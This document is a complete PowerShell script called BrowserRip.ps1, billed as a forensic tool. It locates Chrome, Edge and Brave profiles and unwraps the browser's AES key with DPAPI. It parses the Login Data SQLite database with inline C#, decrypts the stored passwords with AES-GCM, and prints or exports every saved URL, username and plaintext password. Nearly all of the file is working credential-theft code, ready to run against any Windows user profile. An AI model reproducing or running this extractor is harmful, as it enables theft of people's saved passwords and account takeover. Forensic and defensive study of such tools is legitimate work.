<#
.SYNOPSIS
    BrowserRip.ps1 - Forensic Chrome/Edge/Brave credential extractor
    PowerShell 5 | Pure ASCII | Zero external dependencies
.NOTES
    Chrome logins table column order (no leading id col in physical rows):
      col[0] = origin_url
      col[1] = action_url
      col[2] = username_element
      col[3] = username_value
      col[4] = password_element
      col[5] = password_value  (BLOB)
    sqlite_master columns:
      col[0] = type
      col[1] = name
      col[2] = tbl_name
      col[3] = rootpage
      col[4] = sql
.USAGE
    .\BrowserRip.ps1
    .\BrowserRip.ps1 -ExportPath C:\cases\creds.txt
#>

#Requires -Version 5

param(
    [string]$ExportPath = "",
    [switch]$Help
)

if ($Help) {
    Write-Host "Usage: .\BrowserRip.ps1 [-ExportPath <path>]"
    exit
}

Set-StrictMode -Version Latest
$ErrorActionPreference = "SilentlyContinue"

# ---------------------------------------------
# INLINE C# - AES-GCM + SQLITE PARSER
# ---------------------------------------------
$inlineCS = @"
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

public class AesGcmV3 {

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlg, string algId, string impl, uint flags);

    [DllImport("bcrypt.dll")]
    static extern int BCryptCloseAlgorithmProvider(IntPtr hAlg, uint flags);

    [DllImport("bcrypt.dll")]
    static extern int BCryptGenerateSymmetricKey(IntPtr hAlg, out IntPtr phKey, IntPtr keyObj, uint keyObjLen, byte[] secret, uint secretLen, uint flags);

    [DllImport("bcrypt.dll")]
    static extern int BCryptDestroyKey(IntPtr hKey);

    [DllImport("bcrypt.dll")]
    static extern int BCryptDecrypt(IntPtr hKey, byte[] input, uint inputLen, ref BCRYPT_AUTH_INFO auth, byte[] iv, uint ivLen, byte[] output, uint outputLen, out uint result, uint flags);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    static extern int BCryptSetProperty(IntPtr hObj, string prop, byte[] input, uint inputLen, uint flags);

    [StructLayout(LayoutKind.Sequential)]
    struct BCRYPT_AUTH_INFO {
        public uint   cbSize;
        public uint   dwInfoVersion;
        public IntPtr pbNonce;
        public uint   cbNonce;
        public IntPtr pbAuthData;
        public uint   cbAuthData;
        public IntPtr pbTag;
        public uint   cbTag;
        public IntPtr pbMacContext;
        public uint   cbMacContext;
        public uint   cbAAD;
        public ulong  cbData;
        public uint   dwFlags;
    }

    public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] ciphertext) {
        int dataLen = ciphertext.Length - 16;
        if (dataLen < 0) return null;
        byte[] data = new byte[dataLen];
        byte[] tag  = new byte[16];
        Buffer.BlockCopy(ciphertext, 0,       data, 0, dataLen);
        Buffer.BlockCopy(ciphertext, dataLen, tag,  0, 16);

        IntPtr hAlg, hKey;
        BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0);
        byte[] mode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
        BCryptSetProperty(hAlg, "ChainingMode", mode, (uint)mode.Length, 0);
        BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, (uint)key.Length, 0);

        GCHandle nh = GCHandle.Alloc(nonce, GCHandleType.Pinned);
        GCHandle th = GCHandle.Alloc(tag,   GCHandleType.Pinned);

        var ai = new BCRYPT_AUTH_INFO {
            cbSize        = (uint)Marshal.SizeOf(typeof(BCRYPT_AUTH_INFO)),
            dwInfoVersion = 1,
            pbNonce       = nh.AddrOfPinnedObject(),
            cbNonce       = (uint)nonce.Length,
            pbTag         = th.AddrOfPinnedObject(),
            cbTag         = (uint)tag.Length
        };

        byte[] plain = new byte[dataLen];
        uint   pcb;
        int    ret = BCryptDecrypt(hKey, data, (uint)data.Length, ref ai,
                                   null, 0, plain, (uint)plain.Length, out pcb, 0);
        nh.Free();
        th.Free();
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return (ret == 0) ? plain : null;
    }
}

public class SqliteReaderV3 {

    public class Row {
        public string Url;
        public string Username;
        public byte[] PasswordBlob;
    }

    static int PageSize(byte[] db) {
        int ps = (db[16] << 8) | db[17];
        return (ps == 1) ? 65536 : ps;
    }

    // Read unsigned big-endian 16-bit from db at absolute offset
    static int U16(byte[] db, int off) {
        return (db[off] << 8) | db[off + 1];
    }

    // Read unsigned big-endian 32-bit from db at absolute offset
    static int U32(byte[] db, int off) {
        return (db[off] << 24) | (db[off+1] << 16) | (db[off+2] << 8) | db[off+3];
    }

    // Decode SQLite variable-length integer
    static long Varint(byte[] d, ref int o) {
        long r = 0;
        for (int i = 0; i < 9; i++) {
            byte b = d[o++];
            if (i < 8) {
                r = (r << 7) | (b & 0x7FL);
                if ((b & 0x80) == 0) break;
            } else {
                r = (r << 8) | b;
            }
        }
        return r;
    }

    // Byte length of a serial type value
    static int SerialLen(long t) {
        if (t <= 0)  return 0;
        if (t == 1)  return 1;
        if (t == 2)  return 2;
        if (t == 3)  return 3;
        if (t == 4)  return 4;
        if (t == 5)  return 6;
        if (t == 6)  return 8;
        if (t == 7)  return 8;
        if (t == 8 || t == 9) return 0;
        if (t >= 12 && t % 2 == 0) return (int)((t - 12) / 2);
        if (t >= 13 && t % 2 == 1) return (int)((t - 13) / 2);
        return 0;
    }

    // Decode a serial value into object
    static object SerialVal(byte[] d, int o, long t) {
        if (t == 0) return null;
        if (t == 1) return (long)(sbyte)d[o];
        if (t == 2) return (long)(short)((d[o] << 8) | d[o+1]);
        if (t == 3) return (long)((d[o] << 16) | (d[o+1] << 8) | d[o+2]);
        if (t == 4) return (long)((d[o] << 24) | (d[o+1] << 16) | (d[o+2] << 8) | d[o+3]);
        if (t == 5) { long v=0; for(int i=0;i<6;i++) v=(v<<8)|d[o+i]; return v; }
        if (t == 6) { long v=0; for(int i=0;i<8;i++) v=(v<<8)|d[o+i]; return v; }
        if (t == 8) return 0L;
        if (t == 9) return 1L;
        if (t >= 12 && t % 2 == 0) {
            int len = (int)((t-12)/2);
            byte[] b = new byte[len];
            if (len > 0) Array.Copy(d, o, b, 0, len);
            return b;
        }
        if (t >= 13 && t % 2 == 1) {
            int len = (int)((t-13)/2);
            return (len > 0) ? Encoding.UTF8.GetString(d, o, len) : "";
        }
        return null;
    }

    // Parse a leaf cell payload into column values
    static object[] ParseRecord(byte[] db, int payloadStart) {
        int pos = payloadStart;
        long headerBytes = Varint(db, ref pos);
        int  headerEnd   = payloadStart + (int)headerBytes;

        var types = new List<long>();
        while (pos < headerEnd) {
            types.Add(Varint(db, ref pos));
        }

        var vals = new object[types.Count];
        int vp = headerEnd;
        for (int c = 0; c < types.Count; c++) {
            int lenBefore = SerialLen(types[c]);
            vals[c] = SerialVal(db, vp, types[c]);
            Console.Error.WriteLine(string.Format("  ParseRecord col[{0}] type={1} len={2} val={3}",
                c, types[c], lenBefore,
                (vals[c] is string) ? (string)vals[c] :
                (vals[c] is byte[]) ? "BLOB(" + ((byte[])vals[c]).Length + ")" :
                (vals[c] == null) ? "null" : vals[c].ToString()));
            vp += lenBefore;
        }
        return vals;
    }

    // Scan sqlite_master (page 1) for the root page of a named table
    // sqlite_master schema: type(0), name(1), tbl_name(2), rootpage(3), sql(4)
    public static int FindTableRoot(byte[] db, string tableName) {
        int ps = PageSize(db);
        return ScanForRoot(db, ps, 1, tableName);
    }

    static int ScanForRoot(byte[] db, int ps, int pageNum, string tableName) {
        int pageOff = (pageNum - 1) * ps;
        if (pageOff + ps > db.Length) return 0;

        // Page 1 has 100-byte file header before the page header
        int hdrOff  = (pageNum == 1) ? 100 : 0;
        byte pageType = db[pageOff + hdrOff];

        // Cell count and pointer array
        int cellCount = U16(db, pageOff + hdrOff + 3);

        // Cell pointer array starts after 8-byte leaf header or 12-byte interior header
        int ptrArrayOff = pageOff + hdrOff + ((pageType == 0x05) ? 12 : 8);

        if (pageType == 0x05) {
            // Interior page: each cell has a 4-byte left child pointer + varint key
            // Also has a rightmost child pointer at hdrOff+8
            for (int i = 0; i < cellCount; i++) {
                int cellOff = U16(db, ptrArrayOff + i * 2);
                int childPage = U32(db, pageOff + cellOff);
                int found = ScanForRoot(db, ps, childPage, tableName);
                if (found > 0) return found;
            }
            // Follow rightmost pointer
            int rightPage = U32(db, pageOff + hdrOff + 8);
            return ScanForRoot(db, ps, rightPage, tableName);
        }

        if (pageType == 0x0D) {
            // Leaf page
            for (int i = 0; i < cellCount; i++) {
                int cellOff = U16(db, ptrArrayOff + i * 2);
                int absCell = pageOff + cellOff;
                int pos = absCell;

                Varint(db, ref pos); // payload size
                Varint(db, ref pos); // rowid

                try {
                    var cols = ParseRecord(db, pos);
                    if (cols.Length > 3) {
                        string name     = cols[1] as string;
                        object rootObj  = cols[3];
                        if (name == tableName && rootObj is long) {
                            return (int)(long)rootObj;
                        }
                    }
                } catch { }
            }
        }

        return 0;
    }

    // Walk a table B-tree and extract login rows
    static void WalkTable(byte[] db, int ps, int pageNum, List<Row> rows) {
        int pageOff = (pageNum - 1) * ps;
        if (pageOff + ps > db.Length) return;

        int   hdrOff  = 0;
        byte  pageType = db[pageOff + hdrOff];
        int   cellCount = U16(db, pageOff + hdrOff + 3);
        int   ptrArrayOff = pageOff + hdrOff + ((pageType == 0x05) ? 12 : 8);

        if (pageType == 0x05) {
            for (int i = 0; i < cellCount; i++) {
                int cellOff   = U16(db, ptrArrayOff + i * 2);
                int childPage = U32(db, pageOff + cellOff);
                WalkTable(db, ps, childPage, rows);
            }
            int rightPage = U32(db, pageOff + hdrOff + 8);
            WalkTable(db, ps, rightPage, rows);
            return;
        }

        if (pageType != 0x0D) return;

        for (int i = 0; i < cellCount; i++) {
            int cellOff = U16(db, ptrArrayOff + i * 2);
            int absCell = pageOff + cellOff;
            int pos = absCell;

            Varint(db, ref pos); // payload size
            Varint(db, ref pos); // rowid

            try {
                // Chrome logins physical column order:
                // [0] origin_url  [1] action_url  [2] username_element
                // [3] username_value  [4] password_element  [5] password_value
                var cols = ParseRecord(db, pos);

                string url  = (cols.Length > 0) ? (cols[0] as string ?? "") : "";

                // col[2]=username_element col[3]=username_value col[5]=password_value
                // col[3] = username_value (the actual credential)
                // col[2] = username_element (HTML field name, ignored)
                // Positional extraction: find first blob = password, last string before it = username
                byte[] pass = new byte[0];
                string user = "";
                int blobIdx = -1;
                for (int pc = 1; pc < cols.Length; pc++) {
                    if (cols[pc] is byte[] && ((byte[])cols[pc]).Length > 3) {
                        blobIdx = pc;
                        pass = (byte[])cols[pc];
                        break;
                    }
                }
                if (blobIdx > 1) {
                    for (int pc = blobIdx - 1; pc >= 1; pc--) {
                        if (cols[pc] is string && ((string)cols[pc]).Length > 0) {
                            user = (string)cols[pc];
                            break;
                        }
                    }
                }
                // Debug: write all col values to stderr
                var dbg = new System.Text.StringBuilder();
                for (int dc = 0; dc < cols.Length; dc++) {
                    if (cols[dc] is string) dbg.AppendFormat("[{0}]STR={1} ", dc, cols[dc]);
                    else if (cols[dc] is byte[]) dbg.AppendFormat("[{0}]BLOB({1}) ", dc, ((byte[])cols[dc]).Length);
                    else dbg.AppendFormat("[{0}]={1} ", dc, cols[dc] ?? "null");
                }
                Console.Error.WriteLine("COLS: " + dbg.ToString());
                Console.Error.WriteLine("USER: " + user);

                rows.Add(new Row { Url = url, Username = user, PasswordBlob = pass });
            } catch { }
        }
    }

    public static int DiagFindRoot(string path) {
        byte[] db = File.ReadAllBytes(path);
        if (db.Length < 100) return -1;
        string magic = Encoding.ASCII.GetString(db, 0, 6);
        if (!magic.StartsWith("SQLite")) return -2;
        int ps = PageSize(db);
        return FindTableRoot(db, "logins");
    }

    public static List<Row> ReadLogins(string path) {
        var rows = new List<Row>();
        byte[] db = File.ReadAllBytes(path);
        if (db.Length < 100) return rows;

        string magic = Encoding.ASCII.GetString(db, 0, 6);
        if (!magic.StartsWith("SQLite")) return rows;

        int ps   = PageSize(db);
        int root = FindTableRoot(db, "logins");

        if (root < 1) { return rows; }
        WalkTable(db, ps, root, rows);
        return rows;
    }
}
"@

if (-not ([System.Management.Automation.PSTypeName]'AesGcmV3').Type) {
    try {
        Add-Type -TypeDefinition $inlineCS -Language CSharp
        Write-Host "[+] Runtime types compiled OK" -ForegroundColor DarkGray
    } catch {
        Write-Host "[-] Compile failed: $_" -ForegroundColor Red
        exit 1
    }
} else {
    Write-Host "[+] Runtime types loaded" -ForegroundColor DarkGray
}

# ---------------------------------------------
# DPAPI
# ---------------------------------------------
function Invoke-DPAPIDecrypt {
    param([byte[]]$Data)
    Add-Type -AssemblyName System.Security
    try {
        return [Security.Cryptography.ProtectedData]::Unprotect(
            $Data, $null,
            [Security.Cryptography.DataProtectionScope]::CurrentUser
        )
    } catch { return $null }
}

# ---------------------------------------------
# EXTRACT AES KEY FROM Local State
# ---------------------------------------------
function Get-AESKey {
    param([string]$LocalStatePath)
    if (-not (Test-Path $LocalStatePath)) { return $null }
    try {
        $json = Get-Content $LocalStatePath -Raw -Encoding UTF8 | ConvertFrom-Json
        $b64  = $json.os_crypt.encrypted_key
        if (-not $b64) { return $null }
        $raw    = [Convert]::FromBase64String($b64)
        $prefix = [Text.Encoding]::ASCII.GetString($raw[0..4])
        if ($prefix -ne "DPAPI") {
            Write-Warning "Unexpected key prefix: $prefix"
            return $null
        }
        return Invoke-DPAPIDecrypt -Data ($raw[5..($raw.Length - 1)])
    } catch {
        Write-Warning "AES key extraction failed: $_"
        return $null
    }
}

# ---------------------------------------------
# DECRYPT PASSWORD BLOB
# v10/v11: [3B prefix][12B nonce][ciphertext+16B GCM tag]
# Legacy:  raw DPAPI blob
# ---------------------------------------------
function Invoke-DecryptPassword {
    param([byte[]]$Blob, [byte[]]$AESKey)
    if ($null -eq $Blob -or $Blob.Length -lt 15) { return $null }
    try {
        $pfx = [Text.Encoding]::ASCII.GetString($Blob[0..2])
        if ($pfx -eq "v10" -or $pfx -eq "v11") {
            $nonce  = $Blob[3..14]
            $cipher = $Blob[15..($Blob.Length - 1)]
            $plain  = [AesGcmV3]::Decrypt($AESKey, $nonce, $cipher)
            if ($plain) { return [Text.Encoding]::UTF8.GetString($plain) }
        } else {
            $plain = Invoke-DPAPIDecrypt -Data $Blob
            if ($plain) { return [Text.Encoding]::UTF8.GetString($plain) }
        }
    } catch {}
    return $null
}

# ---------------------------------------------
# ENUMERATE BROWSER PROFILES
# ---------------------------------------------
function Find-BrowserProfiles {
    $base = $env:USERPROFILE
    $defs = @(
        [PSCustomObject]@{ Name="Microsoft Edge"; UD=Join-Path $base "AppData\Local\Microsoft\Edge\User Data" },
        [PSCustomObject]@{ Name="Google Chrome";  UD=Join-Path $base "AppData\Local\Google\Chrome\User Data" },
        [PSCustomObject]@{ Name="Brave";          UD=Join-Path $base "AppData\Local\BraveSoftware\Brave-Browser\User Data" }
    )
    $found = @()
    foreach ($b in $defs) {
        if (-not (Test-Path $b.UD)) { continue }
        $ls   = Join-Path $b.UD "Local State"
        $dirs = Get-ChildItem $b.UD -Directory |
                Where-Object { $_.Name -eq "Default" -or $_.Name -match "^Profile \d+$" }
        foreach ($d in $dirs) {
            $ld = Join-Path $d.FullName "Login Data"
            if (Test-Path $ld) {
                $found += [PSCustomObject]@{
                    Browser = $b.Name
                    Profile = $d.Name
                    LS      = $ls
                    LD      = $ld
                }
            }
        }
    }
    return $found
}

# ---------------------------------------------
# MAIN
# ---------------------------------------------

Write-Host ""
Write-Host "==============================================" -ForegroundColor Cyan
Write-Host "  BrowserRip.ps1 - DFIR Credential Extractor" -ForegroundColor Cyan
Write-Host "  PowerShell 5 | No external dependencies   " -ForegroundColor Cyan
Write-Host "==============================================" -ForegroundColor Cyan
Write-Host ""

$profiles    = Find-BrowserProfiles
$credentials = @()
$counter     = 1

if ($profiles.Count -eq 0) {
    Write-Host "[-] No browser profiles found." -ForegroundColor Red
    exit 0
}

foreach ($p in $profiles) {
    Write-Host ("[*] {0} | {1}" -f $p.Browser, $p.Profile) -ForegroundColor Yellow

    $aesKey = Get-AESKey -LocalStatePath $p.LS
    if (-not $aesKey) {
        Write-Warning "    Could not extract AES key - skipping"
        continue
    }

    $tmp = Join-Path $env:TEMP ("LD_" + [IO.Path]::GetRandomFileName() + ".db")
    try {
        Copy-Item $p.LD $tmp -Force -ErrorAction Stop
    } catch {
        Write-Warning "    DB copy failed: $_"
        continue
    }

    $rows = $null
    try {
        $rootPage = [SqliteReaderV3]::DiagFindRoot($tmp)
        Write-Host ("    logins root page: {0}" -f $rootPage) -ForegroundColor DarkGray
        $rows = [SqliteReaderV3]::ReadLogins($tmp)
        Write-Host ("    Rows found: {0}" -f $rows.Count) -ForegroundColor DarkGray
    } catch {
        Write-Warning "    DB read failed: $_"
    }

    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    if ($null -eq $rows) { continue }

    foreach ($row in $rows) {
        if ($row.PasswordBlob.Length -eq 0) { continue }
        $plain = Invoke-DecryptPassword -Blob $row.PasswordBlob -AESKey $aesKey
        if ($plain) {
            $c = [PSCustomObject]@{
                N  = $counter
                B  = $p.Browser
                P  = $p.Profile
                U  = $row.Url
                Un = $row.Username
                Pw = $plain
            }
            $credentials += $c
            Write-Host ("[{0}] {1} | {2} | {3}" -f $counter, $row.Url, $row.Username, $plain) -ForegroundColor Green
            $counter++
        }
    }
}

Write-Host ""

if ($ExportPath -ne "") {
    if ($credentials.Count -gt 0) {
        try {
            $lines = $credentials | ForEach-Object {
                "[{0}] {1} | {2} | {3} | {4} | {5}" -f $_.N, $_.B, $_.P, $_.U, $_.Un, $_.Pw
            }
            [IO.File]::WriteAllLines($ExportPath, $lines, [Text.Encoding]::UTF8)
            Write-Host ("[+] {0} credential(s) exported to {1}" -f $credentials.Count, $ExportPath) -ForegroundColor Cyan
        } catch {
            Write-Warning "Export failed: $_"
        }
    } else {
        Write-Warning "No credentials to export."
    }
}

Write-Host "==============================================" -ForegroundColor Cyan
Write-Host ("  Done. {0} credential(s) found." -f $credentials.Count) -ForegroundColor Cyan
Write-Host "==============================================" -ForegroundColor Cyan
